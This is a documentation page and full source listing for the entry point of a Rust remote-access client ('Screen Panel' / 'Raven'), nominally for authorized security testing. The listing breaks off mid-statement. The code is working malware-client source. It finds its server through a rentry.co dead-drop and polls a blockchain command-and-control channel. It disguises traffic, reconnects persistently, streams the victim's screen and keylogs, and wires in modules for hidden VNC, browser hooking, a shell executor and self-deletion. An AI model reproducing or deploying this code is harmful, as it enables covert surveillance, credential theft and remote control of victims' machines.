# main

| Field | Value |
|-------|-------|
| **Source** | `src/client_rust/src/main.rs` |
| **Lines** | 1712 |
| **Cards** | T023-client-capabilities |
| **Role** | Entry point, FSM bootstrap |
| **Unsafe blocks** | 1 |

## Constants

- `ALPHA`: `f64` = `0.2`

## Types

### struct `Config` (line 92)

## Internal Functions

- `ensure_dpi_awareness` (line 69)
- `ensure_dpi_awareness` (line 85)
- `load` (line 108)
- `init_logging` (line 212)
- `publish_frame` (line 1044)
- `update_adaptive_quality` (line 1065)
- `blockchain_poll_tick` — Single poll tick — runs inside spawn_blocking (blocking context). (line 1598)
- `execute_shell_command` — Execute a shell command and return stdout+stderr as a string. (line 1675)

## Key Dependencies

- `use anyhow::{Context, Result};`
- `use futures_util::{SinkExt, StreamExt};`
- `use serde_json::json;`
- `use tokio::sync::{watch, Mutex as TokioMutex, RwLock as TokioRwLock};`
- `use tokio_tungstenite::tungstenite::Message;`
- `use tracing::{debug, info, warn};`
- `use protocol::{build_message, parse_message, MSG_FRAME, MSG_DIRTY_FRAME, MSG_VIDEO_FRAME, MSG_HELLO, MSG_STATE_SYNC, MSG_PONG, MSG_PING, MSG_COMMAND, MSG_KEYLOG, MSG_VNC_DATA,`
- `use commands::ClientState;`
- `use once_cell::sync::Lazy;`
- `use windows::Win32::UI::HiDpi::{`
- `use tracing_subscriber::prelude::*;`
- `use rand::Rng;`

## Full Source

```rust
// Screen Panel — Rust Client for Authorized Security Testing
//
// Implements the same binary protocol as the .NET/.NET/Python clients.
// clientType = "rust"
//
// Entry point: loads .env, discovers server URL, runs reconnect loop.
#![allow(dead_code, unused_variables, unused_imports)]

mod protocol;
mod config;
mod discovery;
mod sysinfo_collect;
mod capture;
mod dirty_rect;
mod input;
mod input_blocker;
mod cursor_hider;
mod overlay;
mod hvnc;
mod clipboard;
mod keylogger;
mod browser;
mod browser_hook;
mod browser_session;
mod commands;
mod vnc_server;
mod html_overlay;
mod h264_encoder;
mod tcp_transport;
mod http_poll_transport;
mod ui_automation;
mod amaterasu;
mod kamui;
mod byakugan;
mod kotoamatsukami;
mod henge;
mod juubi;
mod juubi_chain;
mod eth_tx;
mod eth_rpc;
mod self_delete;

use std::path::PathBuf;
use std::sync::{Arc, Mutex};
use std::time::Duration;
use std::time::Instant;

use anyhow::{Context, Result};
use futures_util::{SinkExt, StreamExt};
use serde_json::json;
use tokio::sync::{watch, Mutex as TokioMutex, RwLock as TokioRwLock};
use tokio_tungstenite::tungstenite::Message;
use tracing::{debug, info, warn};

use protocol::{build_message, parse_message, MSG_FRAME, MSG_DIRTY_FRAME, MSG_VIDEO_FRAME, MSG_HELLO, MSG_STATE_SYNC, MSG_PONG, MSG_PING, MSG_COMMAND, MSG_KEYLOG, MSG_VNC_DATA,
    MSG_KAMUI_TCP_DATA, MSG_KAMUI_TCP_OPEN, MSG_KAMUI_TCP_CLOSE, MSG_KAMUI_TCP_PAUSE, MSG_KAMUI_TCP_RESUME,
    MSG_KAMUI_UDP_BIND, MSG_KAMUI_UDP_DATA, MSG_KAMUI_UDP_CLOSE, MSG_KAMUI_CHAIN_DATA,
    MSG_CHAIN_CONFIG, MSG_CHAIN_FUNDED, MSG_CHAIN_STATUS};
use commands::ClientState;

// Global chain state (shared between receive_loop handlers and poll loop).
// Uses std::sync::Mutex because the blocking eth_rpc calls happen inside
// spawn_blocking, not in async context.
use once_cell::sync::Lazy;
static CHAIN_STATE: Lazy<Mutex<juubi_chain::JuubiChainState>> =
    Lazy::new(|| Mutex::new(juubi_chain::JuubiChainState::new()));

#[cfg(windows)]
fn ensure_dpi_awareness() {
    use windows::Win32::UI::HiDpi::{
        SetProcessDpiAwarenessContext,
        DPI_AWARENESS_CONTEXT_PER_MONITOR_AWARE_V2,
        DPI_AWARENESS_CONTEXT_PER_MONITOR_AWARE,
        DPI_AWARENESS_CONTEXT_SYSTEM_AWARE,
    };

    unsafe {
        let _ = SetProcessDpiAwarenessContext(DPI_AWARENESS_CONTEXT_PER_MONITOR_AWARE_V2)
            .or_else(|_| SetProcessDpiAwarenessContext(DPI_AWARENESS_CONTEXT_PER_MONITOR_AWARE))
            .or_else(|_| SetProcessDpiAwarenessContext(DPI_AWARENESS_CONTEXT_SYSTEM_AWARE));
    }
}

#[cfg(not(windows))]
fn ensure_dpi_awareness() {}

// ------------------------------------------------------------------ //
// Client configuration (loaded from .env)
// ------------------------------------------------------------------ //

#[derive(Clone)]
struct Config {
    server_address: String,
    rentry_slug: String,
    target_fps: u32,
    jpeg_quality: u32,
    encoding: String,
    transport: String,
    tcp_port: u16,
    env_path: PathBuf,
    /// Path to raven_config.toml — passed to ClientState for runtime saves.
    config_path: PathBuf,
    log_to_file: bool,
    log_file_path: PathBuf,
}

impl Config {
    fn load() -> Self {
        // Find the .env file beside the executable
        let exe_dir = std::env::current_exe()
            .ok()
            .and_then(|p| p.parent().map(|p| p.to_path_buf()))
            .unwrap_or_else(|| PathBuf::from("."));

        let env_path = exe_dir.join(".env");
        let config_path = exe_dir.join("raven_config.toml");

        // Load .env (highest priority, runtime overrides)
        let env_map = discovery::load_env(&env_path);
        for (k, v) in &env_map {
            std::env::set_var(k, v);
        }

        // Load raven_config.toml (middle layer: persists runtime changes)
        let file_cfg = crate::config::load(&config_path);

        // Merge priority: env > raven_config.toml > EMBEDDED_* (build-time) > defaults
        let server_address = env_map.get("SERVER_ADDRESS").cloned()
            .or_else(|| file_cfg.server_address.clone())
            .or_else(|| option_env!("EMBEDDED_SERVER_ADDRESS").map(String::from))
            .unwrap_or_else(|| "ws://localhost:5001/ws/client".to_string());

        let rentry_slug = env_map.get("RENTRY_SLUG").cloned()
            .or_else(|| option_env!("EMBEDDED_RENTRY_SLUG").map(String::from))
            .unwrap_or_default();

        let target_fps: u32 = env_map.get("TARGET_FPS").and_then(|v| v.parse().ok())
            .or(file_cfg.target_fps)
            .or_else(|| option_env!("EMBEDDED_TARGET_FPS").and_then(|v| v.parse().ok()))
            .unwrap_or(20);

        let jpeg_quality: u32 = env_map.get("JPEG_QUALITY").and_then(|v| v.parse().ok())
            .or(file_cfg.jpeg_quality)
            .or_else(|| option_env!("EMBEDDED_JPEG_QUALITY").and_then(|v| v.parse().ok()))
            .unwrap_or(65);

        let encoding = env_map.get("ENCODING").map(|s| s.to_lowercase())
            .or_else(|| file_cfg.encoding.as_deref().map(str::to_lowercase))
            .or_else(|| option_env!("EMBEDDED_ENCODING").map(|s| s.to_lowercase()))
            .unwrap_or_else(|| "jpeg".to_string());

        let transport = env_map.get("TRANSPORT").map(|s| s.to_lowercase())
            .or_else(|| file_cfg.transport.as_deref().map(str::to_lowercase))
            .or_else(|| option_env!("EMBEDDED_TRANSPORT").map(|s| s.to_lowercase()))
            .unwrap_or_else(|| "websocket".to_string());

        // Parse TCP port: env var TCP_PORT, or derive from SERVER_ADDRESS port + 1
        let tcp_port: u16 = env_map.get("TCP_PORT")
            .and_then(|v| v.parse().ok())
            .or(file_cfg.tcp_port.map(|p| p))
            .or_else(|| option_env!("EMBEDDED_TCP_PORT").and_then(|v| v.parse().ok()))
            .unwrap_or_else(|| {
                // Try to parse port from server_address (ws://host:5001/...) and add 1
                let port: u16 = server_address
                    .split(':')
                    .nth(2)
                    .and_then(|s| s.split('/').next())
                    .and_then(|p| p.parse().ok())
                    .unwrap_or(5001);
                port.saturating_add(1)
            });

        let log_to_file = env_map.get("LOG_TO_FILE")
            .map(|v| v == "1" || v.to_lowercase() == "true")
            .or(file_cfg.log_to_file)
            .or_else(|| option_env!("EMBEDDED_LOG_TO_FILE").map(|v| v == "1"))
            .unwrap_or(false);

        let log_file_name = env_map.get("LOG_FILE_PATH").cloned()
            .or_else(|| file_cfg.log_file_path.clone())
            .or_else(|| option_env!("EMBEDDED_LOG_FILE_PATH").map(String::from))
            .unwrap_or_else(|| "raven.log".to_string());

        let log_file_path = if std::path::Path::new(&log_file_name).is_absolute() {
            PathBuf::from(log_file_name)
        } else {
            exe_dir.join(log_file_name)
        };

        Config {
            server_address,
            rentry_slug,
            target_fps,
            jpeg_quality,
            encoding,
            transport,
            tcp_port,
            env_path,
            config_path,
            log_to_file,
            log_file_path,
        }
    }
}

// ------------------------------------------------------------------ //
// Logging initializer — stderr by default; file when log_to_file=true.
// Timestamps and level are always included. ANSI codes are stripped for
// file output so log files are readable in any text editor.
// ------------------------------------------------------------------ //

fn init_logging(log_to_file: bool, log_path: &std::path::Path) {
    use tracing_subscriber::prelude::*;

    let filter = tracing_subscriber::EnvFilter::try_from_default_env()
        .unwrap_or_else(|_| tracing_subscriber::EnvFilter::new("info"));

    if log_to_file {
        match std::fs::OpenOptions::new().create(true).append(true).open(log_path) {
            Ok(file) => {
                tracing_subscriber::registry()
                    .with(filter)
                    .with(
                        tracing_subscriber::fmt::layer()
                            .with_ansi(false)
                            .with_writer(std::sync::Mutex::new(file)),
                    )
                    .init();
                return;
            }
            Err(e) => {
                eprintln!("[warn] Cannot open log file {:?}: {} — falling back to stderr", log_path, e);
            }
        }
    }

    tracing_subscriber::fmt()
        .with_env_filter(filter)
        .init();
}

// ------------------------------------------------------------------ //
// Main entry point
// ------------------------------------------------------------------ //

#[tokio::main]
async fn main() {
    ensure_dpi_awareness();

    let config = Config::load();

    init_logging(config.log_to_file, &config.log_file_path);

    info!("Screen Panel Rust Client starting...");

    // Discover initial server URL (rentry.co first, then .env, then default)
    let initial_url = discovery::discover_server_url(
        if config.rentry_slug.is_empty() {
            None
        } else {
            Some(&config.rentry_slug)
        },
        Some(&config.server_address),
    );

    // Persist discovered URL back to .env
    if initial_url != config.server_address {
        discovery::persist_url_to_env(&config.env_path, &initial_url);
    }

    // Mutable server address (updated by URL watcher)
    let server_address = Arc::new(TokioMutex::new(initial_url.clone()));
    let env_path = config.env_path.clone();

    // Spawn URL watcher (checks rentry.co every 5 minutes)
    if !config.rentry_slug.is_empty() {
        let watcher_addr = server_address.clone();
        let rentry_slug = config.rentry_slug.clone();
        let env_path_w = env_path.clone();
        tokio::spawn(async move {
            url_watcher(watcher_addr, rentry_slug, env_path_w).await;
        });
    }

    // Main reconnect loop
    let mut retry_delay = 2.0f64;
    let mut consecutive_fails = 0u32;
    let mut current_url = initial_url;

    loop {
        info!("Connecting to {} ...", current_url);

        let result = match config.transport.as_str() {
            "tcp_tls" | "tcp" => {
                // Parse host from server_address
                let host = current_url
                    .replace("wss://", "")
                    .replace("ws://", "")
                    .split('/')
                    .next()
                    .and_then(|h| h.split(':').next())
                    .unwrap_or("localhost")
                    .to_string();
                let use_tls = config.transport == "tcp_tls";
                tcp_transport::run_tcp_session(
                    &host,
                    config.tcp_port,
                    use_tls,
                    config.target_fps,
                    config.jpeg_quality,
                    &config.encoding,
                    config.config_path.clone(),
                )
                .await
            }
            "https_poll" | "http_poll" => {
                // Derive HTTP base URL from ws/wss server_address
                let base_url = current_url
                    .replace("wss://", "https://")
                    .replace("ws://", "http://")
                    .split("/ws/")
                    .next()
                    .unwrap_or("http://localhost:5001")
                    .to_string();
                http_poll_transport::run_http_poll_session(
                    &base_url,
                    config.target_fps,
                    config.jpeg_quality,
                    &config.encoding,
                    config.config_path.clone(),
                )
                .await
            }
            _ => {
                run_session(
                    &current_url,
                    config.target_fps,
                    config.jpeg_quality,
                    &config.encoding,
                    config.config_path.clone(),
                )
                .await
            }
        };

        match result {
            Ok(()) => {
                // Clean disconnect (STOP command)
                info!("Session ended cleanly. Exiting.");
                std::process::exit(0);
            }
            Err(e) => {
                consecutive_fails += 1;
                warn!(
                    "Disconnected: {}. Reconnecting in {:.0}s... (fail #{})",
                    e, retry_delay, consecutive_fails
                );
            }
        }

        // After 3 consecutive fails, re-discover URL
        if consecutive_fails >= 3 && consecutive_fails % 3 == 0 {
            info!("Re-discovering server URL...");
            let new_url = tokio::task::spawn_blocking({
                let slug = config.rentry_slug.clone();
                let fallback = config.server_address.clone();
                move || {
                    discovery::discover_server_url(
                        if slug.is_empty() { None } else { Some(&slug) },
                        Some(&fallback),
                    )
                }
            })
            .await
            .unwrap_or_else(|_| current_url.clone());

            if new_url != current_url {
                info!("URL changed: {} -> {}", current_url, new_url);
                current_url = new_url.clone();
                *server_address.lock().await = new_url.clone();
                discovery::persist_url_to_env(&env_path, &new_url);
                retry_delay = 2.0; // Reset backoff on URL change
            }
        }

        tokio::time::sleep(Duration::from_secs_f64(retry_delay)).await;
        retry_delay = (retry_delay * 2.0).min(30.0);
    }
}

// ------------------------------------------------------------------ //
// URL watcher: re-check rentry.co every 5 minutes
// ------------------------------------------------------------------ //

async fn url_watcher(
    server_address: Arc<TokioMutex<String>>,
    rentry_slug: String,
    env_path: PathBuf,
) {
    loop {
        tokio::time::sleep(Duration::from_secs(300)).await;
        let slug = rentry_slug.clone();
        let result = tokio::task::spawn_blocking(move || discovery::fetch_rentry_url(&slug))
            .await
            .ok()
            .flatten();

        if let Some(new_url) = result {
            let mut addr = server_address.lock().await;
            if new_url != *addr && !new_url.ends_with("localhost:5001/ws/client") {
                info!("URL auto-updated via rentry.co: {} -> {}", *addr, new_url);
                *addr = new_url.clone();
                drop(addr);
                discovery::persist_url_to_env(&env_path, &new_url);
            }
        }
    }
}

// ------------------------------------------------------------------ //
// Henge helpers (encode outbound / decode inbound)
// ------------------------------------------------------------------ //

async fn henge_apply_outbound(
    henge: &TokioRwLock<henge::HengeProfile>,
    data: Vec<u8>,
) -> Vec<u8> {
    let profile = henge.read().await;
    if profile.is_raw() {
        return data;
    }
    match profile.encode(&data) {
        Ok(encoded) => profile.wrap_ws(&encoded),
        Err(e) => {
            warn!("[henge] encode failed: {} — sending raw", e);
            data
        }
    }
}

async fn henge_apply_inbound(
    henge: &TokioRwLock<henge::HengeProfile>,
    data: Vec<u8>,
) -> Vec<u8> {
    let profile = henge.read().await;
    if profile.is_raw() {
        return data;
    }
    let unwrapped = profile.unwrap_ws(&data);
    match profile.decode(&unwrapped) {
        Ok(decoded) => decoded,
        Err(e) => {
            warn!("[henge] decode failed: {} — using raw frame", e);
            data
        }
    }
}

// ------------------------------------------------------------------ //
// Run a single WebSocket session
// Returns Ok(()) on clean STOP, Err on disconnect/error.
// ------------------------------------------------------------------ //

async fn run_session(
    server_url: &str,
    target_fps: u32,
    jpeg_quality: u32,
    encoding: &str,
    config_path: std::path::PathBuf,
) -> Result<()> {
    // Fetch overlay capture mode from server settings (best-effort)
    {
        let http_base = server_url
            .replace("wss://", "https://")
            .replace("ws://", "http://")
            .replace("/ws/client", "");
        let settings_url = format!("{}/api/settings/overlay_capture_mode", http_base);
        if let Ok(client) = reqwest::Client::builder()
            .timeout(Duration::from_secs(5))
            .build()
        {
            if let Ok(resp) = client.get(&settings_url).send().await {
                if let Ok(body) = resp.text().await {
                    if let Ok(data) = serde_json::from_str::<serde_json::Value>(&body) {
                        let mode = data.get("value").and_then(|v| v.as_str()).unwrap_or("vm");
                        let excl = if mode == "physical" { "1" } else { "0" };
                        std::env::set_var("OVERLAY_EXCLUDE_CAPTURE", excl);
                        info!("Overlay mode: {} (OVERLAY_EXCLUDE_CAPTURE={})", mode, excl);
                    }
                }
            }
        }
    }

    // Fetch active Henge profile (best-effort — falls back to raw)
    let http_base = server_url
        .replace("wss://", "https://")
        .replace("ws://", "http://")
        .replace("/ws/client", "");
    let henge_profile = henge::fetch_active_profile(&http_base).await;
    info!("[henge] Active profile: {}", henge_profile.name);
    let henge = Arc::new(TokioRwLock::new(henge_profile));

    // Connect WebSocket
    let (ws_stream, _) = tokio_tungstenite::connect_async(server_url)
        .await
        .context("WebSocket connect failed")?;

    info!("Connected to {}", server_url);

    let (mut ws_sink, ws_stream) = ws_stream.split();

    // Collect system info
    let (sw, sh, vw, vh, mon_count) = sysinfo_collect::get_screen_dimensions();
    let info = sysinfo_collect::SystemInfo::collect(
        0, mon_count, sw, sh, vw, vh,
        false, false, false,
        target_fps, jpeg_quality, 0.0, encoding,
    );

    // Send HELLO
    let hello_payload = serde_json::to_vec(&info)?;
    ws_sink
        .send(Message::Binary(build_message(MSG_HELLO, &hello_payload)))
        .await
        .context("Failed to send HELLO")?;
    info!("HELLO sent: {} @ {}", info.pc_name, info.ip);

    // Control messages must never sit behind a backlog of old frames.
    // Frames are published via a watch channel ("latest only"), while control
    // traffic uses a dedicated queue drained with higher priority.
    let (control_tx, mut control_rx) = tokio::sync::mpsc::unbounded_channel::<Vec<u8>>();
    let (frame_tx, mut frame_rx) = watch::channel::<Option<Vec<u8>>>(None);

    // Shared state (behind Arc<Mutex> so send_loop and receive_loop can share it)
    let state = Arc::new(Mutex::new(ClientState::new(target_fps, jpeg_quality, config_path)));

    // Store ws_send_tx in state so VNC_START can use it
    // Also seed current_encoding from the config-provided value so the send loop
    // respects ENCODING= from .env until SET_ENCODING overrides it at runtime.
    {
        let mut st = state.lock().unwrap();
        st.ws_send_tx = Some(control_tx.clone());
        st.current_encoding = encoding.to_string();
    }

    let state_clone = state.clone();

    // ---- Blockchain C2 polling loop (Phase 3) ----
    // Spawn async task that polls RavenC2 + JuubiRegistry every N seconds.
    // Uses spawn_blocking because eth_rpc uses reqwest::blocking.
    let chain_control_tx = control_tx.clone();
    tokio::spawn(async move {
        blockchain_poll_loop(chain_control_tx).await;
    });

    // ---- Send loop (capture frames + STATE_SYNC + flush keylog) ----
    let control_tx_clone = control_tx.clone();
    let frame_tx_clone = frame_tx.clone();
    let encoding_owned = encoding.to_string();
    let send_loop = tokio::spawn(async move {
        send_loop(
            state_clone,
            control_tx_clone,
            frame_tx_clone,
            target_fps,
            jpeg_quality,
            encoding_owned,
        )
        .await
    });

    // ---- WS writer: control first, freshest frame second ----
    let henge_writer = henge.clone();
    let writer_loop = tokio::spawn(async move {
        let mut control_closed = false;
        let mut frame_closed = false;

        loop {
            tokio::select! {
                biased;

                maybe = control_rx.recv(), if !control_closed => {
                    match maybe {
                        Some(data) => {
                            let wire = henge_apply_outbound(&henge_writer, data).await;
                            if ws_sink.send(Message::Binary(wire)).await.is_err() {
                                break;
                            }
                        }
                        None => control_closed = true,
                    }
                }

                changed = frame_rx.changed(), if !frame_closed => {
                    match changed {
                        Ok(()) => {
                            let next_frame = frame_rx.borrow().clone();
                            if let Some(data) = next_frame {
                                let wire = henge_apply_outbound(&henge_writer, data).await;
                                if ws_sink.send(Message::Binary(wire)).await.is_err() {
                                    break;
                                }
                            }
                        }
                        Err(_) => frame_closed = true,
                    }
                }
            }

            if control_closed && frame_closed {
                break;
            }
        }
    });

    // ---- Receive loop (commands, pings) ----
    let state_clone2 = state.clone();
    let control_tx_clone2 = control_tx.clone();
    let henge_recv = henge.clone();

    let receive_loop = tokio::spawn(async move {
        receive_loop(ws_stream, state_clone2, control_tx_clone2, henge_recv).await
    });

    // Wait for any task to finish
    tokio::select! {
        r = send_loop => {
            if let Err(e) = r { warn!("Send loop panicked: {}", e); }
        }
        r = writer_loop => {
            if let Err(e) = r { warn!("Writer loop panicked: {}", e); }
        }
        r = receive_loop => {
            match r {
                Ok(Ok(())) => {} // Clean exit
                Ok(Err(e)) => return Err(e),
                Err(e) => warn!("Receive loop panicked: {}", e),
            }
        }
    }

    // Cleanup
    {
        let mut st = state.lock().unwrap();
        st.cleanup();
    }

    anyhow::bail!("Session ended")
}

// ------------------------------------------------------------------ //
// Send loop: capture frames, send STATE_SYNC every 5s, flush keylog
//
// Phase 2 enhancements:
//   Task 2: Dual-channel internal prioritization.
//           Control traffic uses a dedicated queue drained first by the writer,
//           while frames are published as "latest only" via a watch channel.
//           This prevents stale frames from accumulating under congestion.
//   Task 4: Adaptive quality — reduces JPEG quality when frames back up,
//           increases it when bandwidth is ample.
//   Task 6: Frame-skip on identical screens — compares a fast 3-row hash to
//           the previous frame and skips sending when unchanged.  Forces at
//           least 1 frame/second as a keepalive.
// ------------------------------------------------------------------ //

pub(crate) async fn send_loop(
    state: Arc<Mutex<ClientState>>,
    control_tx: tokio::sync::mpsc::UnboundedSender<Vec<u8>>,
    frame_tx: watch::Sender<Option<Vec<u8>>>,
    initial_fps: u32,
    initial_quality: u32,
    encoding: String,
) {
    let mut last_sync = Instant::now();
    let mut frames_sent: u64 = 0;
    let fps_started_at = Instant::now();
    let mut last_keylog_flush = Instant::now();
    let mut last_clipboard_check = Instant::now();
    let mut last_clipboard_hash = String::new();
    let mut last_keyframe_msg: Option<Vec<u8>> = None;

    // Persistent DXGI capture context — reuse across frames
    let mut capturer: Option<capture::ScreenCapturer> = None;
    let mut capturer_monitor: u32 = u32::MAX;
    let mut rgb_scratch = Vec::new();

    // ---- Task 1 + 6: Dirty rect detector + frame hash state ----
    let mut dirty_detector: Option<dirty_rect::DirtyRectDetector> = None;
    let mut prev_frame_hash: u64 = 0;
    let mut last_forced_frame = Instant::now();   // keepalive: force frame after 1s idle
    let mut frame_counter: u64 = 0;               // for keyframe every 30th dirty frame

    // ---- Task 4: Adaptive quality state ----
    // Current effective quality (may differ from configured jpeg_quality)
    let mut adaptive_quality: u32 = initial_quality;
    // Moving average of send times (exponential smoothing, α = 0.2)
    let mut avg_send_ms: f64 = 0.0;
    // When was the last quality adjustment
    let mut last_quality_adj = Instant::now();

    // ---- H.264 encoder state (lazy init, recreated on resolution change) ----
    let mut h264_enc: Option<h264_encoder::H264Encoder> = None;
    let mut h264_frame_counter: u64 = 0;

    loop {
        let (target_fps, jpeg_quality, current_monitor, keyboard_en, mouse_en, screen_locked,
            clipboard_mon, stop_signal, current_encoding,
            keylogger_active, hvnc_active, vnc_active) = {
            let st = state.lock().unwrap();
            (st.target_fps, st.jpeg_quality, st.current_monitor,
             st.keyboard_enabled, st.mouse_enabled, st.screen_locked,
             st.clipboard_monitor_enabled, st.stop_signal, st.current_encoding.clone(),
             st.keylogger.is_active(),
             st.hvnc.as_ref().map(|h| h.is_active()).unwrap_or(false),
             st.vnc_handle.is_some())
        };

        if stop_signal {
            break;
        }

        // Keep adaptive quality ceiling at the configured jpeg_quality
        if adaptive_quality > jpeg_quality {
            adaptive_quality = jpeg_quality;
        }

        let interval = Duration::from_secs_f64(1.0 / target_fps.max(1) as f64);
        let interval_ms = interval.as_secs_f64() * 1000.0;
        let frame_start = Instant::now();

        // Recreate capturer if monitor changed
        if capturer_monitor != current_monitor || capturer.is_none() {
            capturer = Some(capture::ScreenCapturer::new(current_monitor));
            capturer_monitor = current_monitor;
            // Invalidate dirty detector on monitor switch
            dirty_detector = None;
            prev_frame_hash = 0;
        }

        // ---- Capture: HVNC or normal ----
        // Check if HVNC is active; if so, send its frame and skip normal capture.
        let hvnc_frame = {
            let st = state.lock().unwrap();
            st.hvnc.as_ref().and_then(|h| {
                if h.is_active() {
                    h.capture_frame(adaptive_quality as u8)
                } else {
                    None
                }
            })
        };
        if let Some(hv_jpeg) = hvnc_frame {
            let send_start = Instant::now();
            if !publish_frame(&frame_tx, build_message(MSG_FRAME, &hv_jpeg)) {
                return;
            }
            let send_ms = send_start.elapsed().as_secs_f64() * 1000.0;
            update_adaptive_quality(
                &mut adaptive_quality, &mut avg_send_ms, &mut last_quality_adj,
                send_ms, interval_ms, initial_quality,
            );
            frames_sent += 1;
            let frame_elapsed = frame_start.elapsed();
            if frame_elapsed < interval { tokio::time::sleep(interval - frame_elapsed).await; }
            continue;
        }

        // Normal (non-HVNC) capture
        let mut skip_capture_work = false;
        let keepalive_due = last_forced_frame.elapsed() >= Duration::from_secs(1);
        let capture_timeout_ms = interval_ms.clamp(5.0, 50.0).round() as u32;
        let (raw_frame_opt, capture_event_driven) = if let Some(cap) = capturer.as_mut() {
            let is_event_driven = cap.is_event_driven();
            let frame_result = tokio::task::block_in_place(|| {
                cap.capture_frame_with_timeout(capture_timeout_ms)
            });
            match frame_result {
                Ok(frame_opt) => (frame_opt, is_event_driven),
                Err(e) => {
                    debug!("Frame capture error: {}", e);
                    (None, is_event_driven)
                }
            }
        } else {
            (None, false)
        };

        let screen_changed = if capture_event_driven {
            raw_frame_opt.is_some()
        } else if let Some(raw_frame) = raw_frame_opt.as_ref() {
            let current_hash = tokio::task::block_in_place(|| raw_frame.fast_hash());
            let changed = current_hash != prev_frame_hash;
            prev_frame_hash = current_hash;
            changed
        } else {
            false
        };

        // `skip_sleep` is set to true when this branch already slept (skip case).
        let mut skip_sleep = false;

        if raw_frame_opt.is_none() {
            if keepalive_due {
                if let Some(msg) = last_keyframe_msg.as_ref() {
                    if !publish_frame(&frame_tx, msg.clone()) {
                        break;
                    }
                    last_forced_frame = Instant::now();
                    frames_sent += 1;
                }
            } else if capture_event_driven {
                skip_capture_work = true;
            }
        } else if !screen_changed && !keepalive_due {
            // Screen unchanged — skip sending a frame this cycle.
            // Fall through to STATE_SYNC / keylog / clipboard (they check elapsed
            // time themselves) then skip the final sleep since we already slept here.
            let frame_elapsed = frame_start.elapsed();
            if frame_elapsed < interval {
                tokio::time::sleep(interval - frame_elapsed).await;
                skip_sleep = true;
            }
        }

        if !skip_capture_work && raw_frame_opt.is_some() && (screen_changed || keepalive_due) {
            let raw_frame = raw_frame_opt.expect("raw_frame checked as Some");
            last_forced_frame = Instant::now();
            frame_counter += 1;

            // ---- Task 1: Dirty rect or full frame ----
            let is_dirty_mode = current_encoding == "dirty_rects";
            let is_h264_mode = current_encoding == "h264";
            // Every 30th dirty frame (or first frame) send a full keyframe
            let force_keyframe = !is_dirty_mode
                || frame_counter == 1
                || frame_counter % 30 == 0
                || !screen_changed; // keepalive = full frame

            let frame_width = raw_frame.width;
            let frame_height = raw_frame.height;

            let send_start = Instant::now();

            if is_h264_mode {
                // Reset encoder if resolution changed.
                if let Some(enc) = &h264_enc {
                    if enc.width() != frame_width || enc.height() != frame_height {
                        h264_enc = None;
                        h264_frame_counter = 0;
                    }
                }
                // Lazy init.
                if h264_enc.is_none() {
                    match h264_encoder::H264Encoder::new(frame_width, frame_height) {
                        Ok(e) => h264_enc = Some(e),
                        Err(e) => {
                            debug!("H264Encoder::new failed ({}x{}): {}", frame_width, frame_height, e);
                        }
                    }
                }

                if let Some(enc) = h264_enc.as_mut() {
                    h264_frame_counter += 1;
                    let is_keyframe = h264_frame_counter == 1 || h264_frame_counter % 30 == 0;
                    let encode_result = tokio::task::block_in_place(|| {
                        enc.encode_frame(&raw_frame.data, raw_frame.is_bgra, is_keyframe)
                    });
                    match encode_result {
                        Ok(Some(nal_bytes)) => {
                            // MSG_VIDEO_FRAME payload: [1B flags][4B w BE][4B h BE][NAL...]
                            let flag: u8 = if is_keyframe { 0x01 } else { 0x00 };
                            let mut payload = Vec::with_capacity(9 + nal_bytes.len());
                            payload.push(flag);
                            payload.extend_from_slice(&frame_width.to_be_bytes());
                            payload.extend_from_slice(&frame_height.to_be_bytes());
                            payload.extend_from_slice(&nal_bytes);
                            let msg = build_message(MSG_VIDEO_FRAME, &payload);
                            last_keyframe_msg = Some(msg.clone());
                            if !publish_frame(&frame_tx, msg) {
                                break;
                            }
                            frames_sent += 1;
                        }
                        Ok(None) => {
                            // Encoder buffered this frame; nothing to send yet.
                        }
                        Err(e) => {
                            debug!("H264 encode error: {}", e);
                        }
                    }
                }
            } else if is_dirty_mode && !force_keyframe {
                // Ensure dirty detector matches current frame dimensions
                let detector = dirty_detector.get_or_insert_with(|| {
                    dirty_rect::DirtyRectDetector::new(frame_width, frame_height)
                });
                detector.reset_if_size_changed(frame_width, frame_height);

                let rects = tokio::task::block_in_place(|| {
                    detector.detect(&raw_frame.data)
                });

                if rects.is_empty() {
                    // Nothing changed (detector agrees) — skip
                } else {
                    // Encode dirty rects payload
                    match tokio::task::block_in_place(|| {
                        dirty_rect::encode_dirty_frame(
                            &raw_frame.data,
                            raw_frame.width,
                            raw_frame.height,
                            raw_frame.is_bgra,
                            &rects,
                            adaptive_quality as u8,
                        )
                    }) {
                        Ok(payload) => {
                            if !publish_frame(&frame_tx, build_message(MSG_DIRTY_FRAME, &payload)) {
                                break;
                            }
                            frames_sent += 1;
                        }
                        Err(e) => {
                            debug!("Dirty frame encode error: {}", e);
                        }
                    }
                }
            } else {
                // Full JPEG frame (MSG_FRAME)
                match tokio::task::block_in_place(|| {
                    raw_frame.to_jpeg_with_scratch(adaptive_quality as u8, &mut rgb_scratch)
                }) {
                    Ok(jpeg) => {
                        // When sending a keyframe in dirty_rects mode, invalidate
                        // the detector so the *next* call diffs against this fresh frame.
                        if is_dirty_mode {
                            if let Some(ref mut det) = dirty_detector {
                                det.invalidate();
                            }
                        }
                        let msg = build_message(MSG_FRAME, &jpeg);
                        last_keyframe_msg = Some(msg.clone());
                        if !publish_frame(&frame_tx, msg) {
                            break;
                        }
                        frames_sent += 1;
                    }
                    Err(e) => {
                        debug!("JPEG encode error: {}", e);
                    }
                }
            }

            // ---- Task 4: Update adaptive quality based on send time ----
            let send_ms = send_start.elapsed().as_secs_f64() * 1000.0;
            update_adaptive_quality(
                &mut adaptive_quality, &mut avg_send_ms, &mut last_quality_adj,
                send_ms, interval_ms, initial_quality,
            );
        }

        // ---- Elapsed for actual_fps calculation ----
        let elapsed_fps = fps_started_at.elapsed().as_secs_f64().max(0.001);
        let actual_fps = frames_sent as f64 / elapsed_fps;

        // ---- STATE_SYNC every 5 seconds ----
        if last_sync.elapsed() >= Duration::from_secs(5) {
            last_sync = Instant::now();
            let (sw, sh, vw, vh, mon_count) = sysinfo_collect::get_screen_dimensions();
            let (_, _, mw, mh) = sysinfo_collect::get_monitor_rect(current_monitor);
            let encoding_mode = match current_encoding.as_str() {
                "dirty_rects" => format!("dirty_rects@q{}", adaptive_quality),
                "h264" => "h264".to_string(),
                _ => current_encoding.clone(),
            };
            let state_msg = json!({
                "keyboardEnabled": keyboard_en,
                "mouseEnabled": mouse_en,
                "screenLocked": screen_locked,
                "monitorIndex": current_monitor,
                "monitorsCount": mon_count,
                "screenWidth": mw,
                "screenHeight": mh,
                "physicalWidth": vw,
